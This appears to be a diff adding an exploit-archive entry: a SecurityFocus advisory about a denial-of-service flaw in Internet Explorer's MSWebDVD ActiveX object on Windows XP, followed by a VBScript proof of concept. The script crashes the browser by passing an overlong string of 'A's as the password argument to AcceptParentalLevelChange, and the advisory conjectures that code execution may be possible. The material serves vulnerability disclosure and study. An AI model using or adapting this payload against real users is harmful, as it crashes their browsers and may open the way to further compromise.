@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/10056/info
+
+It has been reported that Internet Explorer may be prone to a denial of service vulnerability that may allow remote attackers to cause the browser to crash. The issue exists in the 'MSWebDVD' Object. An attacker may cause a denial of service condition in an instance of Internet Explorer by evoking the method through a malicious site and sending an excessive string value (about 255 characters) in the following manner:
+
+object.AcceptParentalLevelChange (boolean value),UserName as string,Password
+as string
+
+Internet Explorer running in Windows XP has been reported to be affected by this issue, however, it is possible that other versions are affected as well.
+
+Due to the nature of this issue, it has been conjectured that this vulnerability may be leveraged to execute arbitrary code. This has not been confirmed at the moment. 
+
+
+<script language=vbscript>
+'On Error Resume Next
+dim mymy2,a
+
+a="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+Set mymy2= CreateObject("MSWebDVD.MSWebDVD.1")
+mymy2.AcceptParentalLevelChange False, "xc", a
+
+</script> 
